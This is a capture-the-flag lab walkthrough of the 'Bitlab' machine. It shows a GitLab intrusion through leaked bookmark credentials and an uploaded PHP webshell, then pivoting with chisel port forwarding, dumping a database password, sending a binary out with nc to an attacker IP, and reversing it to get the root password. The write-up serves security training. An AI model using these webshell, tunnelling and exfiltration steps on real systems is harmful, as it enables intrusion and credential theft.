# Bitlab

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.155
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 23:11 EDT
Nmap scan report for 10.129.85.155
Host is up (0.0087s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### GitLab

Port 80 is hosting a GitLab instance:

<figure><img src="../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

It appears I cannot createa a new account, so I took a look at the links present on the site. By clicking on Help, I was brought to a new page:

<figure><img src="../../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

On `bookmarks.html`, there was just a bunch of links to other sites. When the page source is viewed, we can see some obfuscated Javascript at the bottom:

{% code overflow="wrap" %}
```markup
<DT><A HREF="javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()" ADD_DATE="1554932142">Gitlab Login</A>
```
{% endcode %}

When beautified, we get this:

{% code overflow="wrap" %}
```javascript
javascript: (function() {
    var _0x4b18 = [ & quot;\x76\ x61\ x6C\ x75\ x65 & quot;, & quot;\x75\ x73\ x65\ x72\ x5F\ x6C\ x6F\ x67\ x69\ x6E & quot;, & quot;\x67\ x65\ x74\ x45\ x6C\ x65\ x6D\ x65\ x6E\ x74\ x42\ x79\ x49\ x64 & quot;, & quot;\x63\ x6C\ x61\ x76\ x65 & quot;, & quot;\x75\ x73\ x65\ x72\ x5F\ x70\ x61\ x73\ x73\ x77\ x6F\ x72\ x64 & quot;, & quot;\x31\ x31\ x64\ x65\ x73\ x30\ x30\ x38\ x31\ x78 & quot;];
    document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = _0x4b18[3];
    document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = _0x4b18[5];
})()
```
{% endcode %}

Lots of hex characters. I converted them to text to get this:

{% code overflow="wrap" %}
```
var _0x4b18 = [ & quot;value & quot;, & quot;user_login & quot;, & quot;getElementById & quot;, & quot;clave & quot;, & quot;user_password & quot;, & quot;11des0081x & quot;];
```
{% endcode %}

It appears we have a username and password here. We can use this to login to Gitlab. Once in, we can see the projects and things the user has:

<figure><img src="../../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

Within the Profile project, there's an `index.php` file and I found that we can edit this repository. I uploaded a `cmd.php` file and checked if I had RCE when visiting `/profile/cmd.php`. This is done by creating a new Merge Request and Approving it ourselves. We can then trigger the webshell.

```bash
$ curl -G --data-urlencode 'cmd=id' http://10.129.85.155/profile/cmd.php               
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE works, so now we can get a reverse shell easily.

<figure><img src="../../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

I also looked at the Snippets available, and found one:

<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

It had some PostgreSQL Creds:

```php
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
```

## Privilege Escalation

### PostgreSQL Credentials

We can check our privileges, and see that we can run `sudo` with `git pull`.

```
www-data@bitlab:/home/clave$ sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
```

When running `ifconfig`, I found that there were other Docker containers present on this machine.

```
www-data@bitlab:/home/clave$ ifconfig
br-c8b1f0816703: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
        inet6 fe80::42:5dff:feac:94e  prefixlen 64  scopeid 0x20<link>
        ether 02:42:5d:ac:09:4e  txqueuelen 0  (Ethernet)
        RX packets 79233  bytes 29259462 (29.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 75863  bytes 24928657 (24.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:e4:89:e2:2e  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.85.155  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:4ec7  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:4ec7  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:4e:c7  txqueuelen 1000  (Ethernet)
        RX packets 166460  bytes 15229269 (15.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 36577  bytes 18835152 (18.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 457  bytes 53187 (53.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 457  bytes 53187 (53.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth24f1481: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::90aa:eaff:fe6f:ae1  prefixlen 64  scopeid 0x20<link>
        ether 92:aa:ea:6f:0a:e1  txqueuelen 0  (Ethernet)
        RX packets 69304  bytes 105649331 (105.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 67663  bytes 30624616 (30.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth52612f5: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::7c6b:f9ff:fe63:7e14  prefixlen 64  scopeid 0x20<link>
        ether 7e:6b:f9:63:7e:14  txqueuelen 0  (Ethernet)
        RX packets 52638  bytes 22036915 (22.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 50963  bytes 95986807 (95.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth96c1050: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::863:a2ff:fe29:ba89  prefixlen 64  scopeid 0x20<link>
        ether 0a:63:a2:29:ba:89  txqueuelen 0  (Ethernet)
        RX packets 11229  bytes 8106941 (8.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13497  bytes 3820019 (3.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vetha09d067: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::149a:90ff:fef6:8465  prefixlen 64  scopeid 0x20<link>
        ether 16:9a:90:f6:84:65  txqueuelen 0  (Ethernet)
        RX packets 74333  bytes 24522251 (24.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 72105  bytes 24450621 (24.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

We can do a quick ping sweep to check which hosts are alive on the 172.17.0.0/24 subnet.&#x20;

```bash
$ for i in {1..255}; do (ping -c 1 172.19.0.$i | grep "64 bytes"); done
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.038 ms
64 bytes from 172.19.0.3: icmp_seq=1 ttl=64 time=0.059 ms
64 bytes from 172.19.0.4: icmp_seq=1 ttl=64 time=0.081 ms
64 bytes from 172.19.0.5: icmp_seq=1 ttl=64 time=0.056 ms
```

Then, we can download the `nmap` binary to this machine and scan these networks.&#x20;

```
www-data@bitlab:/tmp$ ./nmap_binary 172.19.0.2-5 

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-05-04 03:35 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.19.0.2
Host is up (0.00021s latency).
Not shown: 1206 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.19.0.3
Host is up (0.00057s latency).
Not shown: 1205 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 172.19.0.4
Host is up (0.00055s latency).
Not shown: 1206 closed ports
PORT     STATE SERVICE
5432/tcp open  postgresql

Nmap scan report for 172.19.0.5
Host is up (0.00019s latency).
All 1207 scanned ports on 172.19.0.5 are closed
```

It seems that one of them has PostGreSQL enabled. We didn't have `psql` on the victim machine, so some port forwarding should allow me to access it.

```bash
# on kali
chisel server -p 5555 --reverse
# on victim
./chisel client 10.10.14.13:5555 R:5432:172.19.0.4:5432
```

With this, we can use `psql` on our machine along with the password we found earlier to login.

<figure><img src="../../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

I was able to find a password from this database:

```
profiles=> \d
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | profiles | table | profiles
(1 row)

profiles=> select * from profiles;
 id | username |        password        
----+----------+------------------------
  1 | clave    | c3NoLXN0cjBuZy1wQHNz==
(1 row)
```

Using this password (it isn't base64), we can login as `clave`:

<figure><img src="../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

### RemoteConnection

Within the user's directory, there was an `.exe` file present:

```
clave@bitlab:~$ ls
RemoteConnection.exe  user.txt
```

I downloaded this back to Kali via `nc`.&#x20;

```bash
# on kali
nc -l -p 4444 > RemoteConnection.exe
# on host
nc -w 3 10.10.14.13 4444 < RemoteConnection.exe
```

This is a Windows binary, so we can transfer it to my Windows VM to test with dnSpy and other debuggers. dnSpy was unable to retrieve anything from it, so let's check the assembly code for this using `ida64`. The main issue I had was that there were no function names and I had no clear understanding of what it was doing.&#x20;

I checked using `strings` and found some stuff:

```
parse
Access Denied !!
string too long
invalid string position
GetUserNameW
```

This seems to be parsing some kind of input, and denying access if it is wrong. This could be a password of some sorts. I spent some time looking at the functions from `ghidra`, and found this part here:

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

It appears that this is executing `putty.exe`, which is an SSH client for Windows. That would explain the Access Denied string. This binary was trying to `ssh` somewhere, and there was probably a password being sent. I also found that despite ASLR being enabled, the last 4 characters of addresses are always the same.&#x20;

<figure><img src="../../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

Since there was `ShellExecuteW` being used, we can make a breakpoint there by first checking where it is called. I knew that it was imnported at `0x403108`, so we can check for any `call 0x403108` instructions:

<figure><img src="../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

Let's head to x64dbg and set a breakpoint at `XX165a` since the last 4 characters are always the same.&#x20;

<figure><img src="../../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

We can set another breakpoint at the `cmp` instruction before it as well to see what is being compared within registers too.

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

By removing the breakpoint for `entrypoint` and then jumping to user code to where the `cmp` instruction occurs, we would see this:

<figure><img src="../../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

It appears to be the `root` password. We can test it out and it works:

<figure><img src="../../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

Interesting reverse engineering challenge!&#x20;
